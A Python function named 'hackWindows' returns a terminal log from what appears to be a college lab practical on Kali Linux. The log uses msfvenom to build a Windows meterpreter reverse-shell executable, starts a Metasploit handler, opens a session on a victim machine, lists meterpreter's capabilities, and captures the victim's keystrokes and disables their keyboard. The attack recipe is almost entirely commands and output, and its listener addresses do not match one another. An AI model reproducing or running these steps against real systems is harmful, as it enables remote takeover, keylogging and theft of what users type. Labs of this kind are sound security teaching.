def hackWindows():
    return [
        """

---------------------------
Lab Practical - 3 Commands.
---------------------------

┌──(root㉿kali)-[~]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.44.128  netmask 255.255.255.0  broadcast 192.168.44.255
        inet6 fe80::20c:29ff:fe65:1d94  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:65:1d:94  txqueuelen 1000  (Ethernet)
        RX packets 69  bytes 6405 (6.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35  bytes 4357 (4.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp -f exe -o venom.exe lhost=192.168.75.255 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: venom.exe
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# sudo service apache2 start 
                                                                                                                                                                           
┌──(root㉿kali)-[~]
└─# msfconsole
Metasploit tip: View advanced module options with advanced
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                                               
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                                              
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                                              
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                                             
                                                                                                                                                                           

       =[ metasploit v6.4.9-dev                           ]
+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]
                          ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.75.128
lhost => 192.168.75.128
msf6 exploit(multi/handler) > exploit

[-] Handler failed to bind to 192.168.75.128:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Sending stage (176198 bytes) to 192.168.44.129
[*] Meterpreter session 1 opened (192.168.44.128:4444 -> 192.168.44.129:49169) at 2025-07-15 12:30:32 +0530

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes

For more info on a specific command, use <command> -h or help <command>.

meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
rvr <Right Shift>&jc college of engineerinh<^H>g

meterpreter > uictl disable keyboard
Disabling keyboard...
meterpreter > uictl enable keyboard
Enabling keyboard...

================================================================================================

"""
    ]